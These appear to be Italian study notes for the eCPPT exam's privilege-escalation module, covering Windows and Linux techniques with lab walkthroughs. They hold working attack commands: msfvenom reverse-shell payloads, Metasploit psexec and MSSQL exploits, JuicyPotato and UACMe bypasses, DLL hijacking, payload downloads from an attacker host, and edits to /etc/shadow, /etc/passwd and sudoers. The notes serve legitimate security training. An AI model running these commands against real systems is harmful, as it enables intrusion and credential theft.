---
title: "Modulo 04 — Privilege Escalation (Sintesi consolidata)"
tags:
  - credentials
  - dll-hijacking
  - kerberoasting
  - kerberos
  - lateral-movement
  - linux-privesc
  - metasploit
  - msfvenom
  - mssql
  - nmap
  - nse
  - ntlm
  - privesc
  - rdp
  - scanning
  - shared-library
  - smb
  - sudo
  - suid
  - token-impersonation
  - uac-bypass
  - windows-privesc
---
# Modulo 04 — Privilege Escalation (Sintesi consolidata)

> **Corso:** eCPPT Penetration Testing Professional (NEW — 2024)
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Video totali:** 19 (`01_Course Introduction` → `019_Course Conclusion`)
> **Sorgente cartella:** `../Privilege Escalation/`
> **Scope:** Windows + Linux Privilege Escalation, dal post-exploitation alla shell SYSTEM/root.
> **Out-of-scope (dichiarato dall'istruttore):** initial access, manual local enumeration deep-dive, kernel exploits.

Questo file è la **sintesi tematica** dei 19 video del modulo. È strutturato per **percorso di studio + reference d'esame**: enumeration → identificazione del vettore → exploitation, separato in **Windows** e **Linux** + **token/potato history** + **cheat sheet finale**.

---

## Indice

1. [Concetti fondamentali](#1-concetti-fondamentali)
2. [Windows Privilege Escalation](#2-windows-privilege-escalation)
   - [2.1 Tool automatici: Power⁠Up & PrivescCheck](#21-tool-automatici-powerup--privesccheck)
   - [2.2 Locally Stored Credentials (la triade)](#22-locally-stored-credentials-la-triade)
   - [2.3 Service permissions (insecure, unquoted)](#23-service-permissions-insecure-unquoted)
   - [2.4 Registry AutoRuns](#24-registry-autoruns)
   - [2.5 Token Impersonation (Incognito)](#25-token-impersonation-incognito)
   - [2.6 Juicy Potato](#26-juicy-potato)
   - [2.7 UAC Bypass con UACMe](#27-uac-bypass-con-uacme)
   - [2.8 DLL Hijacking](#28-dll-hijacking)
3. [Linux Privilege Escalation](#3-linux-privilege-escalation)
   - [3.1 Locally stored credentials Linux](#31-locally-stored-credentials-linux)
   - [3.2 Misconfigured file permissions (/etc/passwd, /etc/shadow, /etc/sudoers)](#32-misconfigured-file-permissions-etcpasswd-etcshadow-etcsudoers)
   - [3.3 SUID binaries](#33-suid-binaries)
   - [3.4 Misconfigured SUDO](#34-misconfigured-sudo)
   - [3.5 Shared Library Injection (LD_PRELOAD, RPATH, LD_LIBRARY_PATH)](#35-shared-library-injection-ld_preload-rpath-ld_library_path)
4. [Cheat sheet enumeration (da memorizzare)](#4-cheat-sheet-enumeration-da-memorizzare)
5. [Token & Potato chain history](#5-token--potato-chain-history)
6. [Tabelle differenze](#6-tabelle-differenze)
7. [Attack chains tipiche d'esame](#7-attack-chains-tipiche-desame)
8. [Punti d'attenzione eCPPT — riepilogo finale](#8-punti-dattenzione-ecppt--riepilogo-finale)
9. [Mappa video → tecnica](#9-mappa-video--tecnica)

---

## 1. Concetti fondamentali

> Riferimento: [01_Course Introduction](../Privilege%20Escalation/01_Course%20Introduction.md), [02_Introduction to Privilege Escalation](../Privilege%20Escalation/02_Introduction%20to%20Privilege%20Escalation.md)

**Privilege Escalation (PrivEsc)** = ottenere **privilegi più elevati** in un sistema/network sfruttando vulnerabilità o misconfigurazioni.

- **Windows target:** da utente standard (`john`) → **Administrator** → **NT AUTHORITY\SYSTEM** (il top).
- **Linux target:** da utente standard → **root** (UID 0).

### Tipi di PrivEsc

| Tipo | Cambio di privilegi | Esempio | Tipica detection |
|---|---|---|---|
| **Vertical** | Sì (verso l'alto) | `student` → `root`; `john` → `SYSTEM` | Focus del corso |
| **Horizontal** | No (stessi privilegi, altro account) | `john` → `mary` (entrambi standard) | Spesso step intermedio di lateral movement |

### Perché eseguire privesc

1. Eseguire comandi amministrativi (install, config, registry).
2. **Credential access**: dump LSASS, SAM, `/etc/shadow`, kerberoasting.
3. **Persistence**: registry autoruns, scheduled tasks, cron, systemd.
4. **Pivoting** profondo nella rete (richiede spesso SYSTEM/root).

### Processo generale (vale Win/Linux)

1. **Enumerazione locale** (utente, gruppi, privilegi, software installato, servizi, file scrivibili).
2. **Identificazione vettore** (service insecure, SUID, token, sudo, DLL, ecc.).
3. **Exploitation** → shell/processo con privilegi elevati.
4. **Validation** (`whoami /priv`, `id`, `getuid`/`getprivs`).
5. **Stabilization** (migrate a processo stabile, persistenza opzionale).

### Mindset eCPPT

- Si parte **dopo l'initial access** (eJPT-level). La domanda è "come elevo?", non "come entro?".
- L'esame eCPPT 2024 = **45 domande a risposta multipla** su un ambiente pratico → riconosci subito il vettore dato un output (`sudo -l`, `Invoke-PrivescAudit`, `whoami /priv`).

---

## 2. Windows Privilege Escalation

### 2.1 Tool automatici: Power⁠Up & PrivescCheck

> Riferimento: [03_Privilege Escalation with Power⁠Up](../Privilege%20Escalation/03_Privilege%20Escalation%20with%20Power⁠Up.md), [04_Privilege Escalation with PrivescCheck](../Privilege%20Escalation/04_Privilege%20Escalation%20with%20Privesc%20Check.md)

Sono i **due script PowerShell di riferimento** per la discovery automatica.

#### Power⁠Up (Power⁠Sploit)
- Modulo Privesc di **Power⁠Sploit**. Funzione master: **`Invoke-PrivescAudit`** (alias storico `Invoke-AllChecks`).
- Check eseguiti:
  - Insecure service configurations (binary/path modificabile).
  - **Unquoted service paths**.
  - Weak registry permissions (autoruns, `Run` keys).
  - Vulnerable scheduled tasks.
  - Insecure file permissions.
  - Insecure DLL search order (DLL hijack candidates).
  - **Stored credentials** (WinLogon AutoLogon, Credential Manager).

#### PrivescCheck (standalone — itm4n)
- Indipendente da Power⁠Sploit. Funzione: **`Invoke-PrivescCheck`**.
- Report con **severity** (Low/Medium/High) per ogni issue.
- Più completo di Power⁠Up ma **più lento** (1-2 min vs pochi secondi).

#### Differenze

| Aspetto | Power⁠Up | PrivescCheck |
|---|---|---|
| Framework | Power⁠Sploit | Standalone |
| Funzione master | `Invoke-PrivescAudit` | `Invoke-PrivescCheck` |
| Velocità | Secondi | 1-2 min |
| Output | Lista vulnerabilità | Report con severity |
| Preferenza istruttore | Default | Alternativa di backup |

#### Workflow standard
```powershell
# Verifica chi siamo
whoami
whoami /priv
net localgroup administrators

# Bypass execution policy + import + run
powershell -ep bypass
cd C:\Users\student\Desktop\Power⁠Sploit\Privesc
. .\Power⁠Up.ps1
Invoke-PrivescAudit

# Alternativa (one-liner)
. .\PrivescCheck.ps1; Invoke-PrivescCheck
```

#### Esempio reale (lab del video 03/04)
Power⁠Up/PrivescCheck identificano credenziali AutoLogon clear-text salvate nel registry:
```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
  DefaultUserName  = Administrator
  DefaultPassword  = <plaintext>
```
PrivescCheck etichetta questo check come **`CredsWinlogon` Severity: Medium**.

Sfruttamento:
```cmd
runas.exe /user:administrator cmd         :: privilegi Administrator (non SYSTEM)
psexec.py administrator@10.x.x.x          :: dà SYSTEM (impacket)
```

> **Regola d'oro:** Power⁠Up **non sfrutta**, identifica solo. Sta a te scegliere il vettore. Se Power⁠Up non trova nulla → prova PrivescCheck (e viceversa).

---

### 2.2 Locally Stored Credentials (la triade)

Tre vettori distinti e classici. Memorizza i **path**.

#### A) Unattended Installation Files
> Riferimento: [05_ Unattended Installation Files](../Privilege%20Escalation/05_%20Unattended%20Installation%20Files.md)

L'**Unattended Windows Setup** = meccanismo Microsoft per deployment automatizzato. Le credenziali admin restano nei file XML, **Base64-encoded** (NON cifrate).

**Path da memorizzare:**
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Autounattend.xml`

Struttura tipica:
```xml
<AutoLogon>
  <Password>
    <Value>YWRtaW4xMjM=</Value>
    <PlainText>false</PlainText>
  </Password>
  <Username>Administrator</Username>
</AutoLogon>
```

```bash
echo "YWRtaW4xMjM=" | base64 -d
# admin123
```

Sfruttamento via Metasploit:
```
use exploit/windows/smb/psexec
set RHOSTS <target>
set SMBUser administrator
set SMBPass admin123
exploit
# → meterpreter come NT AUTHORITY\SYSTEM
```

#### B) Windows Credential Manager
> Riferimento: [06_Windows Credential Manager](../Privilege%20Escalation/06_Windows%20Credential%20Manager.md)

**Credential Manager** = password manager built-in (analogo a Keychain macOS). CLI: **`cmdkey`**.

Misconfig: credenziali admin salvate per un utente low-priv → **NON viene mostrata** la password ma può essere **usata** via `runas /savecred`.

```cmd
cmdkey /list
:: Target: Domain:interactive=ADMINISTRATOR
:: Type: Domain Password
:: User: administrator    (password NON mostrata)

runas.exe /savecred /user:administrator cmd
:: si apre cmd come admin SENZA chiedere password
```

Variante reverse shell (no GUI):
```bash
msfvenom -p windows/x64/meter⁠preter/reverse_tcp LHOST=<IP> LPORT=5555 -f exe -o shell.exe
# upload shell.exe sul target
runas.exe /savecred /user:administrator C:\Users\student\shell.exe
# → seconda sessione meterpreter come admin
```

#### C) PowerShell History
> Riferimento: [07_ PowerShell History](../Privilege%20Escalation/07_%20PowerShell%20History.md)

PowerShell mantiene un history file (analogo `.bash_history`):

**Path:** `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

Variabile dinamica equivalente:
```powershell
(Get-PSReadLineOption).HistorySavePath
```

Tipico finding:
```powershell
$username = "Administrator"
$password = ConvertTo-SecureString "<plaintext>" -AsPlainText -Force
```

Mitigation lato difesa: `Set-PSReadLineOption -HistorySaveStyle SaveNothing`.

#### Sintesi triade

| Vettore | Path/Tool | Cosa contiene | Sfruttamento |
|---|---|---|---|
| Unattended | `C:\Windows\Panther\Unattend.xml`, `Autounattend.xml` | Pwd Base64 in `<AutoLogon>` | `base64 -d` → psexec |
| Credential Manager | `cmdkey /list` | Pwd opache (non visibili) | `runas /savecred /user:admin cmd` |
| PowerShell History | `...\PSReadLine\ConsoleHost_history.txt` | Pwd clear-text in comandi | `runas /user:admin cmd` |

> All'esame: shell low-priv su Windows → **controlla SEMPRE questi 3 vettori** PRIMA di andare su tecniche più complesse.

---

### 2.3 Service permissions (insecure, unquoted)

> Riferimento: [08_Exploiting Insecure Service Permissions](../Privilege%20Escalation/08_Exploiting%20Insecure%20Service%20Permissions.md)

I **Windows Services** girano spesso come `LocalSystem`/`LocalService`/`NetworkService`/admin. Se un utente low-priv ha **write** sull'eseguibile o sulla service config, può **sostituire il binario** o **cambiare ImagePath** → al restart, payload eseguito con i privilegi del service account.

#### Tre classi di misconfigurazione

| Classe | Cosa permette | Power⁠Up check |
|---|---|---|
| **Full Control sull'exe del servizio** | Service binary replacement | `Get-ModifiableServiceFile` / `ModifiableServiceFiles` |
| **Unquoted Service Path** | Path con spazi non quotato → drop exe in path intermedio | `Get-UnquotedService` |
| **Modifiable Service Configuration** | Cambiare `binPath` puntando a payload custom | `Get-ModifiableService` |

#### Workflow Service Binary Replacement (lab del video)

1. `Invoke-PrivescAudit` identifica `FileZilla Server` con `ModifiableServiceFiles`.
2. Verifica ACL: `Get-Acl "C:\Program Files (x86)\FileZilla Server" | Format-List` → `student : FullControl`.
3. Verifica `CanRestart: True` (essenziale!).
4. Payload:
   ```bash
   msfvenom -p windows/meter⁠preter/reverse_tcp LHOST=<KALI> LPORT=4444 \
     -f exe -o 'FileZilla server.exe'
   ```
5. Trasferimento via web server Python (`python3 -m http.server 80`) + `IWR -UseBasicParsing`.
6. Handler con **AutoRunScript di migrazione** (evita morte session):
   ```
   use exploit/multi/handler
   set payload windows/meter⁠preter/reverse_tcp
   set LHOST <KALI>
   set LPORT 4444
   set AutoRunScript post/windows/manage/migrate
   exploit
   ```
7. Restart del servizio (`services.msc`, `net stop/start`, `sc stop/start`).
8. Callback meterpreter → **`migrate lsass.exe`** (NON `explorer.exe`!) per mantenere SYSTEM.

#### Unquoted Service Path (caso teorico)
Service con `binPath = C:\Program Files\My Service\app.exe` non quotato → Windows prova:
- `C:\Program.exe`
- `C:\Program Files\My.exe`
- `C:\Program Files\My Service\app.exe`

Se ho write su `C:\` (raro) o su `C:\Program Files\` (più raro) o su una dir intermedia con spazio → drop di un `Program.exe` o `My.exe` → eseguito al restart.

> **Service account → SYSTEM-level privileges = straight win.**

---

### 2.4 Registry AutoRuns

> Riferimento: [09_Privilege Escalation via Registry AutoRuns](../Privilege%20Escalation/09_Privilege%20Escalation%20via%20Registry%20AutoRuns.md)

Una chiave **Run** configura un programma da eseguire automaticamente al **system startup**, **user logon** o **service initialization**. Se un utente low-priv può **scrivere** nella chiave (o sul file in essa referenziato), può fare privesc.

#### Chiavi principali

| Chiave | Trigger | Privilegi del payload |
|---|---|---|
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | System startup (tutti gli utenti) | Privilegi dell'utente che fa logon |
| `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | User logon (utente corrente) | Privilegi dell'utente |
| `HKLM\SYSTEM\CurrentControlSet\Services` | Service init | Spesso `NT AUTHORITY\SYSTEM` |
| `...\RunOnce` | Eseguita una volta sola, poi rimossa | Idem |
| `...\Winlogon\Userinit` / `Shell` | Logon hook | High |

#### Due varianti di sfruttamento

1. **Sovrascrivi l'exe** di un autorun esistente (se hai write sul file).
2. **Crea nuova entry** nella chiave Run (se hai write sulla chiave registry) puntando al tuo payload.

#### Lab walkthrough

```powershell
# 1. Enum
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-Acl "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Format-List
# Cerca: NT AUTHORITY\student FullControl

# 2. Verifica permessi sull'exe esistente (variante 1)
Get-Acl "C:\Program Files\HTTP Server" | Format-List
# Solo ReadAndExecute → variante 1 esclusa, vai sulla 2

# 3. Drop payload + nuova entry
mkdir C:\Users\student\Desktop\tool
iwr -UseBasicParsing -Uri "http://<KALI>/program.exe" -OutFile "C:\Users\student\Desktop\tool\program.exe"

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    /v hacker /t REG_SZ `
    /d "C:\Users\student\Desktop\tool\program.exe" /f

# 4. Trigger (aspetta logon admin o reboot)
shutdown /l
```

Tool GUI di reference per enum totale autoruns: **Autoruns.exe** (Sysinternals) — copre registry + scheduled tasks + services + drivers.

> **Differenza vs Insecure Service Permissions:** lì modifichi il binPath di un service che gira come SYSTEM. Qui il payload gira al logon dell'utente target (può essere admin, non SYSTEM).

---

### 2.5 Token Impersonation (Incognito)

> Riferimento: [010_ Access Token Impersonation](../Privilege%20Escalation/010_%20Access%20Token%20Impersonation.md)

Un **Windows access token** = "chiave temporanea" creata da LSASS dopo l'autenticazione, descrive identità + privilegi del processo/thread.

#### Pipeline di creazione token

1. User si autentica (RDP, console, network) → LSASS valida le credenziali.
2. `winlogon.exe` crea il token (SID utente, gruppi, `Se*Privilege` list).
3. Token attaccato a `userinit.exe` → ereditato da tutti i child process.

#### Due security level

| Tipo | Logon che lo crea | Usabile per |
|---|---|---|
| **Delegate** | Interactive (console, RDP) | Locale **e** remoto |
| **Impersonate** | Non-interactive (service, network) | Solo locale |

#### Prerequisiti dell'attacco

1. **`SeImpersonatePrivilege`** sul proprio token.
2. Almeno un **delegate/impersonate token** di un utente privilegiato già presente in memoria.
3. Tool che faccia l'impersonation (modulo `incognito` di meterpreter).

> Se mancano i token target → **Juicy Potato / PrintSpoofer** li *creano* sfruttando lo stesso `SeImpersonate`.

#### Comandi chiave (in meterpreter)

```text
getuid
getprivs
load incognito
list_tokens -u
list_tokens -g
impersonate_token "DOMAIN\\Administrator"   # doppio backslash + virgolette!
rev2self
```

#### Workflow lab

1. **Initial access**: exploit Rejetto HFS (`exploit/windows/http/rejetto_hfs_exec`) → meterpreter come `NT AUTHORITY\LOCAL SERVICE`.
2. `getprivs` conferma `SeImpersonatePrivilege`.
3. `load incognito` → `list_tokens -u` → trovato delegation token `TARGET\Administrator`.
4. `impersonate_token "TARGET\\Administrator"` → `getuid` ora mostra Administrator.

#### Account di servizio = jackpot

`LOCAL SERVICE`, `NETWORK SERVICE`, `IIS APPPOOL\*`, `NT SERVICE\MSSQL$*` hanno **`SeImpersonate` di default** → la "Potato family" funziona quasi sempre.

---

### 2.6 Juicy Potato

> Riferimento: [011_Juicy Potato](../Privilege%20Escalation/011_Juicy%20Potato.md)

**Juicy Potato** = exploit Windows che sfrutta **DCOM + RPCSS** per **creare** un token SYSTEM impersonabile, sfruttando `SeImpersonate`/`SeAssignPrimaryToken`. Da usare quando NON ci sono token admin già in memoria (Incognito da solo fallisce).

#### Come funziona (tecnico)

1. **CLSID**: ogni componente COM ha un GUID. Alcuni CLSID girano come SYSTEM e accettano comunicazione cross-session.
2. JuicyPotato avvia un **fake OXID resolver** locale e si finge il COM server.
3. Forza l'attivazione DCOM → arriva una connessione **come SYSTEM** verso il fake server.
4. Il fake server acquisisce il token SYSTEM.
5. Con `SeImpersonate` → **impersona** quel token → spawn processo arbitrario come SYSTEM.

#### Sintassi minima

```cmd
JuicyPotato.exe -l <porta_locale> -p <payload.exe> -t * -c {CLSID}
```

| Flag | Significato |
|---|---|
| `-l` | Porta del fake COM server (locale) |
| `-p` | Programma da lanciare (full path) |
| `-a` | Argomenti del programma |
| `-t` | Modalità: `*` prova `CreateProcessWithTokenW` + `CreateProcessAsUser` |
| `-c` | CLSID (dipende dalla versione Windows!) |
| `-k` | Hostname COM server (default `127.0.0.1`) |
| `-n` | Porta COM server (default `135`) |

#### Workflow lab (Server 2016 + MSSQL 2019)

```bash
# 1. Recon + access via MSSQL
use auxiliary/scanner/mssql/mssql_login
# trovato: sa : (empty)
use exploit/windows/mssql/mssql_payload
set USERNAME sa
set PASSWORD ""
exploit
# meterpreter come NT SERVICE\MSSQL$SQLEXPRESS

# 2. Payload secondario
msfvenom -p windows/meter⁠preter/reverse_tcp LHOST=<KALI> LPORT=5555 -f exe -o backdoor.exe

# 3. Handler secondario
use exploit/multi/handler
set LPORT 5555
exploit -j

# 4. Upload + esecuzione
meterpreter > upload backdoor.exe
meterpreter > upload JuicyPotato.exe
meterpreter > shell
C:\> JuicyPotato.exe -l 5555 -p C:\Users\Public\backdoor.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
# authresult 0 → NT AUTHORITY\SYSTEM
```

> CLSID per Server 2016 = `{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}`. Lista completa: repo `ohpe/juicy-potato`.

#### Quando NON funziona (post-2018)

JuicyPotato è patchato in Windows 10 1809+ e Server 2019 → usa **RoguePotato** (RPC redirect su porta 135 esterna) o **PrintSpoofer** (Spooler) o **GodPotato** (RPC moderno).

---

### 2.7 UAC Bypass con UACMe

> Riferimento: [012_Bypassing UAC with UACMe](../Privilege%20Escalation/012_Bypassing%20UAC%20with%20UACMe.md)

**UAC** (User Account Control) impedisce a programmi di fare modifiche di sistema senza approvazione. Un utente in `Administrators` lavora con **token filtrato** (medium integrity) → privilegi admin solo dopo **consent prompt**.

In sessione remota (meterpreter, reverse shell) NON si può cliccare "Yes" → serve **UAC bypass**.

#### Due check fondamentali PRIMA di tentare il bypass

1. Sei in `Administrators`? → `net localgroup administrators`
2. Il tuo token è filtrato? → `whoami /priv` (privilegi minimi), `hash⁠dump` fallisce, `getsystem` fallisce.

Se NON sei in Administrators → UAC bypass è inutile, serve altro vettore.

#### Auto-elevate binaries

Microsoft ha eseguibili firmati con `autoElevate=true` nel manifest:
- `pkgmgr.exe`
- `fodhelper.exe`
- `eventvwr.exe`
- `computerdefaults.exe`
- `sdclt.exe`
- `slui.exe`

Se l'attaccante riesce a far caricare codice arbitrario in quei processi (DLL hijack, registry hijack su `HKCU\Software\Classes\...\shell\open\command`, COM hijack) → codice gira **elevato senza prompt**.

#### UACMe (hfiref0x)

- Framework con **>60 metodi** di bypass UAC.
- Binari: **`Akagi32.exe`** / **`Akagi64.exe`** (match con arch del target).
- Sintassi: `Akagi64.exe <method#> [comando]`. Se ometti il comando → `cmd.exe` elevato di default.

#### Metodi famosi

| # | Tecnica | Versione Win | Note |
|---|---|---|---|
| 23 | DLL hijack su `pkgmgr.exe` | 7 → 10 | Usato nel lab |
| 33 | DLL hijack su `consent.exe` | | |
| 41 | `eventvwr.exe` + registry hijack `mscfile` | 7 → 10 1809 (fix) | Famoso "Enigma0x3" |
| 56 | `fodhelper.exe` + `ms-settings` hijack | 10 | Tra i più usati |
| 62 | `slui.exe` + env var | | |

#### Workflow lab

```text
1. meterpreter come 'admin' (member of Administrators)
2. sysinfo → Server 2012; migrate explorer.exe
3. whoami /priv → solo privilegi standard = filtered token
4. hash⁠dump → fails
5. getsystem → fails
6. msfvenom -p windows/meter⁠preter/reverse_tcp LHOST=<KALI> LPORT=5555 -f exe -o backdoor.exe
7. handler secondario LPORT 5555
8. upload backdoor.exe + Akagi64.exe in C:\Users\admin\AppData\Local\Temp\
9. Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
10. Nuova session: getuid ancora 'admin' MA getprivs mostra TUTTI i privilegi admin
11. migrate lsass.exe → hash⁠dump funziona
```

> **Importante:** UAC bypass dà privilegi **High Integrity / Administrator**, NON SYSTEM. Per SYSTEM da admin → service install, `psexec -s`, token impersonation di SYSTEM token, scheduled task.

#### Tabella UAC bypass methods riepilogo

| Metodo | Tecnica base | Auto-elevate binary | Status moderno |
|---|---|---|---|
| 23 | DLL hijack | `pkgmgr.exe` | Patchato in build recenti |
| 33 | DLL hijack | `consent.exe` | |
| 41 | Registry hijack `mscfile` | `eventvwr.exe` | Fixed 10 1809 |
| 56 | Registry hijack `ms-settings` | `fodhelper.exe` | Spesso ancora unfixed |
| 62 | Env var hijack | `slui.exe` | |

> Consulta sempre la tabella aggiornata su `github.com/hfiref0x/UACME` per scegliere il metodo in base alla build esatta.

---

### 2.8 DLL Hijacking

> Riferimento: [013_DLL Hijacking](../Privilege%20Escalation/013_DLL%20Hijacking.md)

**DLL Hijacking**: piazzare una DLL malevola con lo stesso nome di una DLL che un programma cerca seguendo il **DLL search order**. Quando il programma (eseguito da utente più privilegiato) parte, carica la DLL malevola → codice gira coi suoi privilegi.

#### DLL Search Order (default, SafeDllSearchMode abilitato)

1. **Directory dell'applicazione**.
2. **System directory** (`C:\Windows\System32`).
3. **16-bit system directory** (`C:\Windows\System`).
4. **Windows directory** (`C:\Windows`).
5. **Current directory**.
6. Directory in **`PATH`**.

#### Varianti

| Variante | Cosa fa |
|---|---|
| **Search Order Hijacking** | DLL piazzata in dir precedente a quella legittima nell'ordine |
| **DLL Side-Loading** | App firmata Microsoft + manifest specifica DLL non firmata side-by-side |
| **Phantom DLL Loading** | App cerca una DLL che **non esiste** → crei tu il "fantasma" (caso del lab) |
| **DLL Replacement** | Sovrascrivi una DLL legittima (richiede write sull'originale) |
| **DLL Proxying** | DLL malevola **forwarda** chiamate a quella vera (no crash, stealth) |

#### Metodologia (3 step)

1. **Identifica programma vulnerabile** (admin/SYSTEM: services, scheduled tasks, autoruns).
2. **Analizza dipendenze DLL con Procmon**:
   - `Process Name = target.exe`
   - `Operation = CreateFile`
   - `Result = NAME NOT FOUND`
3. **Verifica permessi e drop**:
   - `Get-Acl` sulla destinazione → conferma write.
   - `msfvenom -f dll -o <nome_esatto>.dll` → drop → trigger.

#### Lab walkthrough (Phantom DLL)

```text
1. RDP come admin → Procmon64.exe → escludi Registry/Network
2. Filtri: Process Name=DVTA.exe, Operation=CreateFile, Result=NAME NOT FOUND
3. Lancia DVTA.exe → vedi dwrite.dll NOT FOUND in C:\Users\Administrator\Desktop\DVTA\bin\Release\
4. Come student: Get-Acl su quella cartella → student : FullControl
5. msfvenom -p windows/meter⁠preter/reverse_tcp LHOST=<KALI> LPORT=4444 -f dll -o dwrite.dll
6. iwr -UseBasicParsing -Uri http://<KALI>/dwrite.dll -OutFile dwrite.dll
7. copy dwrite.dll "C:\Users\Administrator\Desktop\DVTA\bin\Release\"
8. Admin lancia DVTA.exe → meterpreter come admin
```

#### Tool di discovery

- **Procmon64** (Sysinternals): gold standard.
- **Power⁠Up**: `Find-ProcessDLLHijack`, `Find-PathDLLHijack` (cerca dir scrivibili nel `$env:PATH`).

> **OPSEC:** se la DLL malevola fa crash dopo il payload, il programma muore visibilmente → usa un **loader DLL proxy** per essere stealth.

> **DLL Hijacking è alla base di molti UACMe methods** (es. method 23 → `pkgmgr.exe`).

---



### Quiz: Windows Privesc - Enumerazione, Power⁠Up, servizi e DLL hijacking

<div class="ecppt-quiz" data-module="04_Privilege_Escalation" data-block="0"></div>

## 3. Linux Privilege Escalation

### 3.1 Locally stored credentials Linux

> Riferimento: [014_Locally Stored Credentials](../Privilege%20Escalation/014_Locally%20Stored%20Credentials.md)

Tecnica più semplice ma estremamente comune. Cerca **credenziali in chiaro** in file di config (web app, DB, script). **Password reuse**: la password DB spesso = password root del sistema.

#### Dove cercare

| Posto | Cosa cercare |
|---|---|
| `/var/www/html`, `/var/www/*` | `config.php`, `wp-config.php`, `database.inc.php`, `.env`, `settings.py` |
| `/etc/` | `/etc/mysql/`, `/etc/apache2/`, `/etc/nginx/`, `/etc/fstab` (mount creds) |
| `/home/<user>/` | `.bash_history`, `.viminfo`, `.mysql_history`, `.ssh/id_rsa`, `.git-credentials`, `.netrc`, `.aws/credentials` |
| `/opt/` | App custom |
| `/root/` | Raro (di solito non leggibile) |
| `/tmp/`, `/var/tmp/` | Script temporanei, dump, backup |
| `/var/backups/`, `.sql`, `.tar.gz` | Dump database con hash |
| `/proc/*/environ` | Env vars dei processi (a volte password) |

#### Pattern grep

```bash
grep -rni "password" /var/www/html 2>/dev/null
grep -rni "passwd"   /var/www/html 2>/dev/null
grep -rni "db_user\|db_pass\|DB_USERNAME\|DB_PASSWORD" /var/www/html 2>/dev/null
grep -rni "api[_-]?key\|secret\|token" /var/www/html 2>/dev/null

find / \( -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" -o -name "*.yml" \) 2>/dev/null \
  | xargs grep -l -i "pass" 2>/dev/null
```

#### Lab walkthrough

```bash
student@target:~$ whoami; groups
student
student

student@target:~$ cd /var/www/html
student@target:/var/www/html$ grep -r db_user .
./local_config/database.inc.php:$db_user = "root";

student@target:/var/www/html$ cat local_config/database.inc.php
$db_user = "root";
$db_pass = "S3cretP@ss";

student@target:~$ su root
Password: S3cretP@ss
root@target:/home/student# id
uid=0(root) gid=0(root) groups=0(root)
```

> Sempre `2>/dev/null` quando ricerchi su tutto il fs come low-priv (taglia il rumore di permission denied).

---

### 3.2 Misconfigured file permissions (/etc/passwd, /etc/shadow, /etc/sudoers)

> Riferimento: [015_Misconfigured File Permissions](../Privilege%20Escalation/015_Misconfigured%20File%20Permissions.md)

File di sistema sensibili con permessi troppo permissivi (writable da non-root). I tre file-scuola: **`/etc/passwd`**, **`/etc/shadow`**, **`/etc/sudoers`**.

#### Permessi default vs misconfig

| File | Default | Misconfig sfruttabile |
|---|---|---|
| `/etc/passwd` | `644 root:root` (world-read, no write) | World-writable → aggiungi user UID 0 |
| `/etc/shadow` | `640 root:shadow` (solo root) | World-readable/writable → leggi hash o reset hash root |
| `/etc/sudoers` | `440 root:root` | World-writable → aggiungi `NOPASSWD: ALL` per il tuo user |

#### Discovery comandi

| Comando | Cosa cerca |
|---|---|
| `find / -not -type l -perm -o+w 2>/dev/null` | File world-writable (no symlink) — comando del video |
| `find / -writable -type f 2>/dev/null` | File scrivibili dal current user (più accurato) |
| `find / -perm -222 -type f 2>/dev/null` | Equivalente classico world-writable |
| `find / -perm -o+w -type d 2>/dev/null` | Directory world-writable (target per drop) |
| `find / -perm -u=s -type f 2>/dev/null` | SUID binaries (vedi 3.3) |
| `find / -readable -name shadow 2>/dev/null` | `/etc/shadow` se readable |

#### A) /etc/shadow writable

```bash
# 1. Discovery
find / -not -type l -perm -o+w 2>/dev/null | grep -v "/proc\|/sys"
ls -al /etc/shadow
# -rw-rw-rw- 1 root shadow  → red flag

# 2. Genera hash (MD5 o SHA-512)
openssl passwd -1 -salt abc password
# $1$abc$E5VPGgmnxIRVfTKwANS.10
# (alternativa moderna)
openssl passwd -6 -salt xyz password
# $6$xyz$...

# 3. Edit shadow → sostituisci field 2 della riga root
vim /etc/shadow
# root:$1$abc$E5VPGgmnxIRVfTKwANS.10:19000:0:99999:7:::

# 4. su root
su root
# Password: password
# whoami → root
```

#### B) /etc/passwd writable

```bash
openssl passwd -1 -salt xyz P@ssw0rd
echo 'pwn:$1$xyz$....:0:0::/root:/bin/bash' >> /etc/passwd
su pwn        # UID 0 → root shell
```

**UID 0 = root**, indipendentemente dal nome. Linux accetta hash legacy in `/etc/passwd` campo 2.

#### C) /etc/sudoers writable

```bash
echo 'student ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
sudo -i
```

#### Altri pattern correlati

- **Script o cron job di root scrivibili** → inietta comandi → next run come root.
- **`/etc/cron.d/*`, `/etc/init.d/*`** writable → idem.
- **Backup files** (`.bak`, `~`) con permessi laschi che rivelano credenziali.

---

### 3.3 SUID binaries

> Riferimento: [016_Exploiting SUID Binaries](../Privilege%20Escalation/016_Exploiting%20SUID%20Binaries.md)

**SUID** (Set-owner User ID) = bit speciale che fa **eseguire un binario coi privilegi del file owner**, non con quelli del lanciante. Rappresentato dalla **`s`** al posto della `x` user: `-rwsr-xr-x`. Ottale `4xxx` (es. `4755`).

Casi legittimi: `passwd` (deve scrivere `/etc/shadow`), `sudo`, `mount`, `ping` (vecchi sistemi).

#### Permessi speciali Linux

| Bit | Ottale | Effetto |
|---|---|---|
| **SUID** | 4xxx | Esegui con UID dell'owner |
| **SGID** | 2xxx | Esegui con GID dell'owner |
| **Sticky bit** | 1xxx | Solo l'owner può rimuovere file in dir condivise (es. `/tmp`) |

#### Quando un SUID binary è exploitable

1. **Owner = root** (o utente privilegiato).
2. **Permesso `x` per il nostro utente**.
3. Il binario ha **shell escape** interna O permette **read/write arbitrario** O ha un **bug** noto.

#### Discovery

```bash
find / -perm -u=s -type f 2>/dev/null
# equivalente
